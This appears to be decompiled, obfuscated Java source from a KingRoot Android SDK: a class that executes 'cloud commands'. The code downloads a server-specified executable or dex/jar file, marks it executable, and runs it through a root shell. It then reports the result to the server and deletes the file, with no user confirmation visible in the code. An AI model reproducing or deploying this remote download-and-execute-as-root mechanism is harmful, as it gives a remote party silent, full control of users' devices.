package com.kingroot.sdk;

import android.content.Context;
import android.text.TextUtils;
import com.kingroot.sdk.C0692by.C0669a;
import java.io.File;
import java.util.ArrayList;
import java.util.Locale;
import krsdk.RootShell;
import krsdk.RootShell.ShellResult;

/* renamed from: com.kingroot.sdk.bn */
public class C0678bn extends C0668bj {
    /* renamed from: ds */
    protected String f1680ds;
    /* renamed from: dt */
    private C0732d f1681dt = null;

    public C0678bn(int i, String str, C0732d c0732d) {
        super(i);
        this.f1680ds = str;
        this.f1681dt = c0732d;
        C0633at.m1463g("ExeCmdExecuter(), mTipsId:" + this.f1680ds);
    }

    /* renamed from: a */
    private int m1613a(Context context, C0870l c0870l, String str) {
        String absolutePath = context.getFilesDir().getAbsolutePath();
        final int i = c0870l.f2169N;
        final String str2 = c0870l.f2171P;
        C0674bl.m1599a(c0870l.f2168M, str, new C0692by(context, absolutePath, new C0669a() {
            /* renamed from: a */
            public void mo5651a(C0689bx c0689bx) {
                C0678bn.this.m1615a(2, 1);
                if (c0689bx != null) {
                    final String absolutePath = c0689bx.getAbsolutePath();
                    new C0650gj() {
                        public void run() {
                            C0678bn.this.m1618b(i, absolutePath, str2);
                        }
                    }.mo5630bs();
                }
            }

            /* renamed from: b */
            public void mo5652b(C0689bx c0689bx) {
                C0678bn.this.m1615a(2, 0);
            }
        }));
        return 1;
    }

    /* renamed from: a */
    private String m1614a(int i, String str, String str2) {
        return i == 2 ? C0678bn.m1620e(str, str2) : i == 1 ? C0678bn.m1619d(str, str2) : new C0685bu().mo5655a(i, str, str2);
    }

    /* renamed from: a */
    private void m1615a(int i, int i2) {
        C0633at.m1463g("reportCloudCmdExecuterResult(), phase:" + i + ", cmdRes:" + i2);
        if (this.f1681dt != null && !TextUtils.isEmpty(this.f1680ds)) {
            ArrayList arrayList = new ArrayList();
            arrayList.add(C0671bk.m1590a(this.f1680ds, this.f1681dt.f1786j, 0, i, 0, i2));
            if (arrayList.size() > 0) {
                C0866h c0866h = new C0866h();
                c0866h.f2156z = arrayList;
                C0658be.m1541a(c0866h);
                C0633at.m1463g("reportCloudCmdExecuterResult(), 执行反馈上报");
            }
        }
    }

    /* renamed from: b */
    private void m1618b(int i, String str, String str2) {
        RootShell c = C0659bf.m1548c(true);
        if (c != null) {
            C0633at.m1463g("设置exe,jar属性");
            if (!C0671bk.m1586A(str)) {
                C0633at.m1463g("设置exe,jar属性失败");
            }
            String a = m1614a(i, str, str2);
            c.executeCommand2("id");
            C0633at.m1463g("runExeCmd(), cmds:" + a);
            ShellResult executeCommand2 = c.executeCommand2(a);
            if (executeCommand2.success()) {
                m1615a(3, 1);
                C0633at.m1463g("mTipsId:" + this.f1680ds + "执行exe,jar成功");
            } else {
                m1615a(3, 0);
                C0633at.m1463g("runExeCmd(), mStdErr:" + executeCommand2.stdout);
            }
            C0633at.m1463g("runExeCmd(), mStdOut:" + executeCommand2.stdout);
        } else {
            m1615a(3, 2);
        }
        if (i != 4 && i != 3) {
            if (c != null) {
                try {
                    c.executeCommand("rm " + str);
                    return;
                } catch (Exception e) {
                    return;
                }
            }
            new File(str).delete();
        }
    }

    /* renamed from: d */
    public static String m1619d(String str, String str2) {
        return String.format(Locale.US, "export CLASSPATH=%s && /system/bin/app_process /system/bin %s", new Object[]{str, str2});
    }

    /* renamed from: e */
    public static String m1620e(String str, String str2) {
        if (TextUtils.isEmpty(str2)) {
            return str;
        }
        return String.format("%s %s", new Object[]{str, str2});
    }

    /* renamed from: v */
    private String m1621v(int i) {
        long currentTimeMillis = System.currentTimeMillis();
        return (i == 1 || i == 3) ? "jarFile_" + currentTimeMillis + ".dex" : "exeFile_" + currentTimeMillis;
    }

    /* renamed from: ac */
    public int mo5647ac() {
        if (this.f1670do == null) {
            return 2;
        }
        C0870l c0870l = (C0870l) this.f1670do;
        return m1613a(getContext(), c0870l, m1621v(c0870l.f2169N));
    }

    /* renamed from: ad */
    public boolean mo5648ad() {
        return true;
    }

    /* renamed from: b */
    public void mo5649b(byte[] bArr) {
        mo5646a(bArr, new C0870l());
    }
}
